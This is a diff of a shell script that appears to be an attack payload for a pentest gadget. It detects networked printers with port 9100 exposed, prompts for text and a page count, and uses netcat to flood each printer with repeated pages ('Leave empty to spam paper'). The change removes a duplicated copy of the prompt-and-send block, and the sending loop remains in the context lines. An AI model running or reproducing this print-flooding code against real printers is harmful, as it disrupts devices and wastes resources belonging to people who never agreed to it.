@@ -61,32 +61,6 @@ if [ -z "$PRNTPGS" ]; then
     exit 0
 fi
 
-spinner2=$(START_SPINNER "Sending payload to printer")
-for PRINTERS in "${PRNTR[@]}"; do
-    for pages in $(seq "$PRNTPGS"); do
-        echo -e "$PRNTTXT\n\f"
-    done | nc -c "$PRINTERS" 9100
-done
-STOP_SPINNER "${spinner2}"
-
-sleep .5
-
-LOG green "Payload sent!"
-    exit 0
-fi
-
-LOG green "Printer(s) found at: ${PRNTR[@]} with port 9100 exposed!"
-sleep 1.5
-
-# Text and number of pages to be printed:
-PRNTTXT="$(TEXT_PICKER 'Enter text to be printed' 'Leave empty to spam paper')"
-PRNTPGS="$(TEXT_PICKER 'Number of pages to print?' '')"
-if [ -z "$PRNTPGS" ]; then
-    ALERT "Number of pages to print cannot be empty!"
-    LOG red "Exiting."
-    exit 0
-fi
-
 # Send payload:
 spinner2=$(START_SPINNER "Sending payload to printer")
 for printers in "${PRNTR[@]}"; do
